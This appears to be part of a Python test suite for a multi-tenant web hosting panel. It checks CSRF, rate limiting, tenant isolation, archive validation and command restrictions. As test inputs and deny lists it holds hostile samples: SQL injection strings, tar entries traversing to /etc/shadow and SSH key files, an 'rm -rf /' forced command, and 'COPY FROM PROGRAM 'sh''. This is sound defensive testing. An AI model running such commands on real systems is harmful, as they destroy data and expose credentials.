      admin.post("/api/subdomains/parked", data={
          "parked": "example.com", "parent": "example.com"}).status_code == 400)

print("\nAlerts")
from modules import notify  # noqa: E402

notify.SETTINGS_FILE = Path(tempfile.mkdtemp(prefix="hp-alerts-")) / "alerts.conf"
notify.write_root_file = lambda path, content: path.write_text(content)
check("alerts are off until configured",
      admin.get("/api/alerts/settings").json()["enabled"] is False)
check("enabling without an address is refused",
      admin.post("/api/alerts/settings", data={"enabled": "yes", "to": ""}).status_code == 400)
check("an unknown check is refused",
      admin.post("/api/alerts/settings", data={
          "enabled": "no", "checks": "explode"}).status_code == 400)
check("a threshold outside 50-100 is refused",
      admin.post("/api/alerts/settings", data={
          "enabled": "no", "threshold": 10}).status_code == 400)
enabled = admin.post("/api/alerts/settings", data={
    "enabled": "yes", "to": "ops@example.com", "threshold": 85,
    "checks": "disk,backup,service"})
check("valid settings are accepted", enabled.status_code == 200)
check("a dry run reports without sending",
      admin.post("/api/alerts/run", data={"dry_run": "yes"}).status_code == 200)
check("repeat alerts are suppressed by a cooldown",
      notify.recently_sent("nothing-has-fired") is False)
check("a plain user cannot read alert settings",
      alice.get("/api/alerts/settings").status_code == 403)

print("\nAlerts reach a real backend")
alert_settings = admin.get("/api/alerts/settings")
check("the alerts settings endpoint answers", alert_settings.status_code == 200)
check("the checks are a fixed named set",
      {"disk", "backup", "certificate", "service"} <=
      {c["key"] for c in alert_settings.json()["available_checks"]})
check("settings persist",
      admin.post("/api/alerts/settings", data={
          "enabled": "yes", "to": "ops@example.com",
          "threshold": "90", "checks": "disk,backup"}).status_code == 200
      and admin.get("/api/alerts/settings").json()["to"] == "ops@example.com")
check("an address is required when alerts are on",
      admin.post("/api/alerts/settings", data={
          "enabled": "yes", "to": "notanemail"}).status_code == 400)
check("an impossible threshold is refused",
      admin.post("/api/alerts/settings", data={
          "enabled": "no", "threshold": "5"}).status_code == 400)
check("a dry run changes nothing and reports findings",
      admin.post("/api/alerts/run", data={"dry_run": "yes"}).status_code == 200)
check("a plain user cannot read alert settings",
      alice.get("/api/alerts/settings").status_code == 403)

print("\nBackend and UI stay in step")
import re as _re  # noqa: E402
import subprocess as _subprocess  # noqa: E402
from pathlib import Path as _Path  # noqa: E402

_tools = _Path(__file__).resolve().parent.parent / "tools"
for _name, _label in (("audit_wiring.py", "every endpoint is reachable from the UI or documented as API-only"),
                      ("audit_contracts.py", "every field the UI reads exists in the response")):
    _audit = _subprocess.run([sys.executable, str(_tools / _name)],
                             capture_output=True, text=True)
    check(_label, _audit.returncode == 0, _audit.stdout[-500:] if _audit.returncode else "")

# The lockout test above deliberately locked this account out. Clear it, or
# every later sign-in in this file inherits a fifteen-minute penalty.
with store.connect() as _db:
    _db.execute("DELETE FROM login_attempts")

print("\nSecurity headers")
headers = client.get("/login").headers
check("a content security policy is sent", "Content-Security-Policy" in headers)
check("the panel refuses to be framed",
      "frame-ancestors 'none'" in headers.get("Content-Security-Policy", "")
      and headers.get("X-Frame-Options") == "DENY")
check("content type sniffing is off", headers.get("X-Content-Type-Options") == "nosniff")
check("referrers are not leaked", headers.get("Referrer-Policy") == "no-referrer")
check("api responses are not cached",
      admin.get("/api/tokens").headers.get("Cache-Control") == "no-store")

print("\nCross-site request forgery")
forged = Client(main.app)
forged.post("/login", data={"username": "admin", "password": PASSWORD})
csrf = forged.cookies.get("hp_csrf")
check("a token is issued to the page", bool(csrf))
check("a state-changing request without the token is refused",
      TestClient(main.app, cookies=forged.cookies).post(
          "/api/tokens", data={"name": "forged", "scopes": "read"}).status_code == 403)
check("a wrong token is refused",
      forged.post("/api/tokens", data={"name": "x", "scopes": "read"},
                  headers={"X-CSRF-Token": "wrong"}).status_code == 403)
check("the right token is accepted",
      forged.post("/api/tokens", data={"name": "csrf ok", "scopes": "read"}).status_code == 200)
check("reads are unaffected", forged.get("/api/tokens").status_code == 200)

bearer = forged.post("/api/tokens", data={"name": "bearer", "scopes": "read"}).json()["token"]
check("a bearer client needs no csrf token, having no cookies to forge",
      TestClient(main.app).get(
          "/api/stats", headers={"Authorization": f"Bearer {bearer}"}).status_code == 200)

print("\nRequest limits")
check("an oversized body is refused before it is read",
      forged.post("/api/tokens", data={"name": "big", "scopes": "read"},
                  headers={"Content-Length": str(64 * 1024 * 1024)}).status_code == 413)

# The limiter is disabled for the rest of the suite, so it is exercised here
# against a bare app rather than through the panel.
from fastapi import FastAPI as _FastAPI  # noqa: E402

import guard  # noqa: E402

_bare = _FastAPI()


@_bare.get("/api/ping")
def _ping():
    return {"ok": True}


@_bare.post("/api/backups")
def _expensive():
    return {"ok": True}


_bare.add_middleware(guard.RateLimitMiddleware, enabled=True)
_bare_client = TestClient(_bare)
_codes = [_bare_client.get("/api/ping").status_code for _ in range(260)]
check("a client hammering an endpoint is throttled", 429 in _codes)
check("throttling starts at the documented limit",
      429 in _codes and _codes.index(429) + 1 == guard.DEFAULT_LIMIT + 1)
check("a retry time is given",
      "Retry-After" in _bare_client.get("/api/ping").headers)

_expensive_codes = [_bare_client.post("/api/backups").status_code for _ in range(8)]
check("expensive operations have a tighter limit",
      429 in _expensive_codes and _expensive_codes.index(429) <= guard.EXPENSIVE["/api/backups"])

print("\nIsolation security")
from modules import appservers as _appservers  # noqa: E402
from modules import isolation as _isolation  # noqa: E402

# Every tenant directory is group www-data so nginx can serve static files.
# That makes "run it as www-data" equivalent to "let it read every customer's
# secrets", so there must be no path that quietly does so.
appserver_source = (_Path(__file__).resolve().parent.parent
                    / "app/modules/appservers.py").read_text()
run_as_web_user = _re.search(r'return\s+"www-data"', appserver_source)
check("an application never falls back to running as the web server user",
      run_as_web_user is None)

check("hosting an application on an un-isolated account is refused",
      blocked(lambda: _appservers.owner_system_user("no-such-domain.example")))

pool = _isolation.POOL_TEMPLATE
check("the pool runs as the tenant, not a shared user",
      "user = {system_user}" in pool and "www-data" not in pool.split("listen.owner")[0])
for dangerous in ("pcntl_exec", "dl", "putenv", "symlink", "link", "mail"):
    check(f"{dangerous} is disabled, since it defeats open_basedir",
          dangerous in pool.split("disable_functions")[1].split("\n")[0])
check("open_basedir is pinned to the tenant's own tree",
      "open_basedir] = {home}" in pool)
check("url wrappers are off, so a remote file cannot become code",
      "allow_url_include] = off" in pool and "allow_url_fopen] = off" in pool)

root_helper_source = (_Path(__file__).resolve().parent.parent
                      / "app/hostpanel-root").read_text()
check("the tenant home is setgid so uploads stay servable",
      'chmod 2750 "$HOME_ROOT"' in root_helper_source)
check("the tenant home is owned by the tenant, grouped to the web server",
      ('chown -R "$USERNAME:$WEB_GROUP" "$HOME_ROOT"' in root_helper_source
       and 'WEB_GROUP="www-data"' in root_helper_source
       and 'WEB_GROUP="apache"' in root_helper_source))

apps_source = (_Path(__file__).resolve().parent.parent / "app/modules/apps.py").read_text()
check("wp-config.php is not group-readable, since the group is the web server",
      "chmod(0o600)" in apps_source and "chmod(0o640)" not in apps_source)
check("WordPress trusts the nginx HTTPS proxy header",
      "HTTP_X_FORWARDED_PROTO" in apps.WP_CONFIG
      and "$_SERVER['HTTPS'] = 'on'" in apps.WP_CONFIG)

print("\nPrivileged commands are actually permitted")
sudo_audit = _subprocess.run(
    [sys.executable, str(_Path(__file__).resolve().parent.parent / "tools/audit_sudo.py")],
    capture_output=True, text=True,
)
check("every sudo invocation has a matching sudoers rule",
      sudo_audit.returncode == 0,
      sudo_audit.stdout[-800:] if sudo_audit.returncode else "")

print("\nStaging: serialized-safe URL rewriting")
from modules.staging import replace_serialized  # noqa: E402


def php_string(text: bytes) -> bytes:
    return b's:%d:"%s";' % (len(text), text)


def lengths_valid(blob: bytes) -> bool:
    """Every s:<n>:"..." must declare the true byte length of what follows."""
    for match in _re.finditer(rb's:(\d+):"', blob):
        declared = int(match.group(1))
        start = match.end()
        if blob[start + declared:start + declared + 2] != b'";':
            return False
    return True


live, stage = b"//example.com", b"//staging.example.com"

simple = php_string(b"https://example.com/wp-content")
check("a serialized string keeps a correct length when the value grows",
      lengths_valid(replace_serialized(simple, live, stage)))

array = (b"a:2:{" + php_string(b"siteurl") + php_string(b"https://example.com")
         + php_string(b"home") + php_string(b"https://example.com") + b"}")
rewritten_array = replace_serialized(array, live, stage)
check("every string in a serialized array is fixed up", lengths_valid(rewritten_array))
check("the replacement actually happened", live not in rewritten_array)

nested = php_string(php_string(b"https://example.com") + b" wrapped")
check("serialization nested inside a string is handled",
      lengths_valid(replace_serialized(nested, live, stage)))

plain = b'INSERT INTO wp_options VALUES ("siteurl","https://example.com");'
check("ordinary SQL outside any serialized value is still replaced",
      stage in replace_serialized(plain, live, stage))

untouched = php_string(b"https://other.example.org/x")
check("strings that do not match are left byte-for-byte alone",
      replace_serialized(untouched, live, stage) == untouched)

shrinking = php_string(b"https://staging.example.com/page")
check("publishing back to live shrinks the length correctly",
      lengths_valid(replace_serialized(shrinking, stage, live)))

naive = simple.replace(live, stage)
check("a plain search and replace would have corrupted it, and does not here",
      not lengths_valid(naive) and lengths_valid(replace_serialized(simple, live, stage)))

print("\nStaging: safety defaults")
from modules import staging as _staging  # noqa: E402

check("a staging site is password protected",
      "auth_basic" in _staging.STAGING_VHOST)
check("a staging site refuses search engines",
      "noindex" in _staging.STAGING_VHOST and "Disallow: /" in _staging.STAGING_VHOST)
check("publishing requires typing the domain",
      "confirm == domain" in (_Path(__file__).resolve().parent.parent
                              / "app/modules/staging.py").read_text())
check("staging on a domain you do not own is refused",
      alice.post("/api/staging/bob-site.com").status_code == 403)

print("\nMigration: archives are hostile input")
import io as _io  # noqa: E402
import tarfile as _tarfile  # noqa: E402
from modules.migrate import safe_members, survey  # noqa: E402

migrate_dir = Path(tempfile.mkdtemp(prefix="hp-mig-"))


def build_archive(name, entries):
    path = migrate_dir / name
    with _tarfile.open(path, "w:gz") as archive:
        for info, payload in entries:
            archive.addfile(info, _io.BytesIO(payload) if payload is not None else None)
    return path


def plain(name, payload=b"x"):
    info = _tarfile.TarInfo(name)
    info.size = len(payload)
    return info, payload


def linked(name, target, kind=_tarfile.SYMTYPE):
    info = _tarfile.TarInfo(name)
    info.type = kind
    info.linkname = target
    return info, None


def device(name):
    info = _tarfile.TarInfo(name)
    info.type = _tarfile.CHRTYPE
    return info, None


def archive_refused(path):
    try:
        with _tarfile.open(path) as archive:
            safe_members(archive)
        return False
    except HTTPException:
        return True


check("an absolute path in an archive is refused",
      archive_refused(build_archive("a1.tar.gz", [plain("/etc/passwd")])))
check("a traversing path is refused",
      archive_refused(build_archive("a2.tar.gz", [plain("../../root/.ssh/authorized_keys")])))
check("a symlink pointing outside is refused",
      archive_refused(build_archive("a3.tar.gz", [linked("u/l", "/etc/shadow")])))
check("a hardlink is refused",
      archive_refused(build_archive("a4.tar.gz",
                                    [linked("u/h", "/etc/shadow", _tarfile.LNKTYPE)])))
check("a device node is refused",
      archive_refused(build_archive("a5.tar.gz", [device("u/dev")])))

good = build_archive("good.tar.gz", [
    plain("kund/homedir/public_html/index.php", b"<?php"),
    plain("kund/mysql/kund_wp.sql", b"CREATE TABLE t;"),
    plain("kund/userdata/example.com", b"docroot: /home/kund"),
    plain("kund/dnszones/example.com.db", b"@ IN SOA ns1."),
    plain("kund/va/example.com", b"info@example.com"),
])
check("a legitimate archive is accepted", not archive_refused(good))
found = survey(good)
check("the layout is recognised as cPanel", found["kind"] == "cpanel")
check("the source account is read", found["source_account"] == "kund")
check("domains are listed", found["domains"] == ["example.com"])
check("databases are listed", found["databases"] == ["kund_wp"])
check("dns zones are listed", found["dns_zones"] == ["example.com"])
check("importing needs admin", alice.get("/api/migrate/archives").status_code == 403)

print("\nDatabase manager scope")
from modules import dbadmin  # noqa: E402

for statement in ("GRANT ALL ON *.* TO x", "CREATE USER a@b", "DROP DATABASE other",
                  "SELECT * INTO OUTFILE '/tmp/x' FROM t", "SHUTDOWN"):
    check(f"refuses: {statement[:28]}", bool(dbadmin.FORBIDDEN.search(statement)))
check("a plain SELECT is allowed", not dbadmin.FORBIDDEN.search("SELECT * FROM posts"))
check("a write is recognised as a write",
      bool(dbadmin.WRITES.match("DELETE FROM posts")))
check("a read is not treated as a write",
      not dbadmin.WRITES.match("SELECT * FROM posts"))
check("system databases are never browsable",
      "mysql" in dbadmin.SYSTEM_DBS and "information_schema" in dbadmin.SYSTEM_DBS)
check("a user cannot browse a database they do not own",
      alice.get("/api/db/somebody_else/tables").status_code == 403)

print("\nSSH keys")
from modules import ssh as _ssh  # noqa: E402

valid_key = ("ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIH1sT0e0RhCPzXvJ4Yl0aQ0m"
             "0000000000000000000000 me@laptop")
check("a well-formed key is accepted", _ssh.KEY_RE.match(valid_key) is not None)
check("a key with a forced command is refused",
      bool(_ssh.DANGEROUS_OPTIONS.search('command="rm -rf /" ' + valid_key)))
check("a private key pasted by mistake is not a public key",
      _ssh.KEY_RE.match("-----BEGIN OPENSSH PRIVATE KEY-----") is None)
check("nonsense is refused", _ssh.KEY_RE.match("not a key at all") is None)
check("the shell is restricted, not a full one",
      _ssh.RESTRICTED_SHELL.endswith("rbash"))
check("the command allowlist has no shell in it",
      not {"bash", "sh", "zsh", "python", "perl"} & set(_ssh.ALLOWED_COMMANDS))
check("enabling shell access is admin only",
      alice.post("/api/ssh/alice/enable", data={"enabled": "yes"}).status_code == 403)

print("\nSupport sessions")
from modules import impersonate as _imp  # noqa: E402

check("an ordinary user cannot start one",
      alice.post("/api/impersonate/bob", data={"minutes": "10"}).status_code == 403)
check("an admin cannot be impersonated",
      admin.post("/api/impersonate/admin", data={"minutes": "10"}).status_code == 400)
check("the account list excludes admins",
      all(a["role"] != "admin"
          for a in admin.get("/api/impersonate/candidates").json()["accounts"]))
check("sessions are capped in length", _imp.MAX_MINUTES <= 240)
check("account, token and 2FA changes are out of scope",
      set(_imp.BLOCKED_WHILE_IMPERSONATING) ==
      {"/api/accounts/users", "/api/accounts/2fa", "/api/tokens"})
check("the scope check runs in the request path, not only in the module",
      "IMPERSONATION_BLOCKLIST" in (_Path(__file__).resolve().parent.parent
                                    / "app/core.py").read_text())

shutil.rmtree(migrate_dir, ignore_errors=True)

print("\nPostgreSQL")
from modules import postgres as _pg  # noqa: E402

for payload in ["pw'; DROP DATABASE x; --", "back\\slash", "quote''double"]:
    quoted = _pg.quote_literal(payload)
    body = quoted[2:-1]
    check(f"quotes {payload[:20]!r} safely",
          quoted.startswith("E'") and quoted.endswith("'")
          and "'" not in body.replace("''", ""))

for statement in ("CREATE ROLE evil SUPERUSER", "ALTER SYSTEM SET x = 1",
                  "COPY t FROM PROGRAM 'sh'", "GRANT ALL TO x",
                  "DROP DATABASE other", "CREATE EXTENSION plpython3u"):
    check(f"refuses: {statement[:30]}", bool(_pg.FORBIDDEN.search(statement)))
check("an ordinary SELECT is allowed",
      not _pg.FORBIDDEN.search("SELECT * FROM posts"))

check("roles are namespaced, since a Postgres role is cluster-wide",
      _pg.role_for("alice", "app") != _pg.role_for("bob", "app"))
check("generated role names stay valid identifiers",
      valid_ident_check(_pg.role_for("alice", "app")))
check("postgres ownership is tracked apart from mysql",
      "pgdatabase" in (_Path(__file__).resolve().parent.parent
                       / "app/modules/postgres.py").read_text())
check("a status call answers even with no cluster installed",
      admin.get("/api/postgres/status").status_code == 200)
check("a user cannot browse a postgres database they do not own",
      alice.get("/api/postgres/notmine/tables").status_code == 403)

print("\nRedis cache isolation")
from modules import cache as _cache  # noqa: E402

check("each account gets its own key prefix",
      _cache.prefix_for("alice") != _cache.prefix_for("bob"))
check("each account gets its own redis user",
      _cache.acl_user("alice") != _cache.acl_user("bob"))
for command in ("flushall", "flushdb", "config", "keys", "shutdown", "acl"):
    check(f"{command} is denied to tenants", command in _cache.DENIED_COMMANDS)
check("ACLs are required, so old Redis is refused rather than trusted",
      _cache.MIN_VERSION >= 6)
check("status answers even with no redis installed",
      admin.get("/api/cache/status").status_code == 200)
check("enabling a cache user is admin only",
      alice.post("/api/cache/alice/enable").status_code == 403)
check("key counting uses SCAN, not KEYS",
      "SCAN" in (_Path(__file__).resolve().parent.parent
                 / "app/modules/cache.py").read_text()
      and '"KEYS"' not in (_Path(__file__).resolve().parent.parent
                           / "app/modules/cache.py").read_text())

print("\nBackups cover every engine")
backup_source = (_Path(__file__).resolve().parent.parent
                 / "app/modules/backups.py").read_text()
check("postgres databases are dumped too", "postgres-dump" in backup_source)
check("postgres is listed in the manifest", '"postgres": postgres' in backup_source)
check("postgres can be restored", 'what == "postgres"' in backup_source)

print("\nEvery module with a router is mounted")
wiring = _subprocess.run(
    [sys.executable, str(_Path(__file__).resolve().parent.parent / "tools/audit_wiring.py")],
    capture_output=True, text=True)
check("no module is built but left unimported",
      "never imported" not in wiring.stdout,
      wiring.stdout[-400:] if "never imported" in wiring.stdout else "")

print("\nPHP settings")
from modules import php as _php  # noqa: E402

php_source = (_Path(__file__).resolve().parent.parent / "app/modules/php.py").read_text()
check("tunable directives are an allowlist, not free text", "TUNABLE = {" in php_source)
tunable = set(_php.TUNABLE)
for dangerous in ("open_basedir", "disable_functions", "auto_prepend_file",
                  "allow_url_include", "extension"):
    check(f"{dangerous} is not tunable", dangerous not in tunable)
    check(f"{dangerous} is refused explicitly", dangerous in _php.NEVER)
check("every tunable carries bounds",
      all({"min", "max"} <= set(v) for v in _php.TUNABLE.values()))
check("enabling an extension is admin only",
      alice.post("/api/php/extensions/8.3",
                 data={"name": "imagick", "enabled": "yes"}).status_code == 403)
check("worker counts are admin only",
      alice.post("/api/php/pool/alice",
                 data={"version": "8.3", "max_children": "40"}).status_code == 403)
check("an invalid php version is refused",
      admin.post("/api/php/extensions/notaversion",
                 data={"name": "gd"}).status_code == 400)

print("\nWeb server handler")
from modules import webserver as _ws  # noqa: E402

check("the modes are a fixed set",
      set(_ws.MODES) == {"nginx", "apache", "hybrid", "openlitespeed"})
check("apache is bound to localhost, not the public interface",
      "127.0.0.1" in _ws.APACHE_VHOST)
check("htaccess cannot smuggle in a program",
      bool(_ws.HTACCESS_FORBIDDEN.search("Action foo /cgi-bin/x")))
check("htaccess cannot override the panel's php settings",
      bool(_ws.HTACCESS_FORBIDDEN.search("php_admin_value open_basedir none")))
check("ordinary rewrite rules are accepted",
      not _ws.HTACCESS_FORBIDDEN.search("RewriteEngine On\nRewriteRule ^a$ /b [L]"))
check("OpenLiteSpeed stays behind a loopback proxy",
      "127.0.0.1" in _ws.OLS_PROXY_VHOST and _ws.OLS_PORT == 8088)
check("OpenLiteSpeed overwrites forwarded client identity",
      "X-Forwarded-For $remote_addr" in _ws.OLS_PROXY_VHOST
      and "$proxy_add_x_forwarded_for" not in _ws.OLS_PROXY_VHOST)
check("WordPress rewrite syntax is accepted by the OLS editor",
      _ws.unsupported_ols_htaccess(
          "<IfModule mod_rewrite.c>\nRewriteEngine On\nRewriteRule . /index.php [L]\n</IfModule>") is None)
check("Apache-only directives are rejected by the OLS editor",
      _ws.unsupported_ols_htaccess("Options -Indexes") == "Options")
_ols_root = (_Path(__file__).resolve().parent.parent / "app/hostpanel-root").read_text()
check("OpenLiteSpeed LSPHP runs as the account identity",
      "extUser $USERNAME" in _ols_root and "extGroup $USERNAME" in _ols_root)
check("OpenLiteSpeed mirrors HostPanel PHP limits",
      "phpIniOverride" in _ols_root and "PHP_OVERRIDE_LINES" in _ols_root)
check("OpenLiteSpeed configuration is tested before restart",
      '"$OLS_ROOT/bin/openlitespeed" -t' in _ols_root)
check("restarting OpenLiteSpeed is admin only",
      alice.post("/api/webserver/openlitespeed/restart").status_code == 403)
check("a handler change on someone else's domain is refused",
      alice.post("/api/webserver/bob-site.com", data={"mode": "hybrid"}).status_code == 403)

print("\nDatabase users")
from modules import dbusers as _dbu  # noqa: E402

dbusers_source = (_Path(__file__).resolve().parent.parent
                  / "app/modules/dbusers.py").read_text()
check("privilege sets are named, not raw GRANT text", "PRIVILEGE_SETS" in dbusers_source)
check("some usernames are reserved", "RESERVED_USERS" in dbusers_source)
check("opening a user to the internet warns about it", "firewall" in dbusers_source)
check("a user cannot grant on a database they do not own",
      alice.post("/api/dbusers/users", data={
          "name": "x", "password": "a-long-password", "database": "notmine",
          "privileges": "readwrite"}).status_code == 403)

print("\nSign out")
# The legacy script replaces ``client`` during the 2FA section.  Authenticate
# this fresh browser before exercising the sign-out flow; otherwise the test
# only proves that an unauthenticated visitor sees the login redirect.
client.post("/login", data={"username": "admin", "password": PASSWORD})
confirmation = client.get("/logout")
check("legacy logout URL is a non-mutating confirmation page",
      confirmation.status_code == 200 and client.get("/").status_code == 200)
check("confirmed logout clears the session",
      client.post("/logout/form", data={"csrf_token": client.cookies.get("hp_csrf", "")}).status_code == 302)
check("dashboard is protected again", client.get("/").status_code == 303)

shutil.rmtree(SANDBOX, ignore_errors=True)
shutil.rmtree(BACKUP_SANDBOX, ignore_errors=True)
print(f"\n{passed} passed, {failed} failed\n")
sys.exit(1 if failed else 0)
